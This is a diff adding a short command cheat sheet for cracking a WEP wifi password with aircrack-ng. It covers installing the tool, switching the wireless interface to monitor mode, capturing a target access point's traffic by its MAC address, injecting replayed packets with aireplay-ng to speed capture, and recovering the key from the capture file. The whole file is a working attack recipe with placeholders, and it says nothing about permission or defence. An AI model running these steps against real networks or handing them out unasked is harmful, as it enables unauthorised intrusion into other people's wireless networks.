@@ -1,0 +1,24 @@
+# INSTALL
+sudo apt install aircrack-ng
+
+# STARTING CRACK 
+
+## READ WIFI NETWORK INTERFACE DATA
+sudo su 
+iw dev
+
+# START CRACKIGNG
+airmon-ng start <INTERFACE_NAME>
+iw dev # now wifi network interface has another name
+airodump-ng <INTERFACE_NAME_MONITOR_MODE>
+airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>
+
+# FORCE NETWORK TRAFFIC
+aireplay-ng -3 <INTERFACE_NAME_MONITOR_MODE> -b <AP_MAC_ADDRESS>
+
+
+# CRACK WEP PASSWORD USING <OUTPUT_FILE_CAPTURE> 
+aircrack-ng <OUTPUT_FILE_CAPTURE> 
+
+# STOP MONITOR MODE
+airmon-ng stop <INTERFACE_NAME>
